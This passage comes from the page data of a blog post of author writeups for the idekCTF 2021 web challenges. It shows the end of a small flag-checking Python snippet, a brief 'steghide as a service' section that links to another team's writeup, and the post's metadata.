punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># lol</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token string\">b'idek{'</span> <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n    exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nexit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h1 id=\"steghide-as-a-service\" style=\"position:relative;\"><a href=\"#steghide-as-a-service\" aria-label=\"steghide as a service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>steghide as a service</h1>\n<p>i don’t have time to write a full writeup at the moment, but I highly recommend reading <a href=\"https://twitter.com/NeptunianHacks\">Neptunian</a>’s writeup, <a href=\"https://fireshellsecurity.team/idekctf-writeups/#steghide-as-a-service\">here</a>. It is incredibly well written, as are all of their writeups.</p>","frontmatter":{"title":"idekCTF 2021 - Author Web Writeups","date":"December 13, 2021","description":"solutions for the web challenges I created for idekCTF 2021 (difference checker, fancy notes, generic pastebin challenge, steghide as a service, and jinjail)"}},"previous":{"fields":{"slug":"/FwordCTF-2021-L33k/"},"frontmatter":{"title":"FwordCTF 2021 - L33k"}},"next":{"fields":{"slug":"/securinets-narutokeeper/"},"frontmatter":{"title":"Securinets CTF Quals 2022 - NarutoKeeper"}}},"pageContext":{"id":"ec65eaed-3151-5027-a79b-7084e95fa01d","previousPostId":"f8fa2cb2-666c-55c5-a9d8-0758f04f7158","nextPostId":"fd6d8d87-0aa0-5d99-9147-f335a679d9c5"}},"staticQueryHashes":["1044197826","2841359383"]}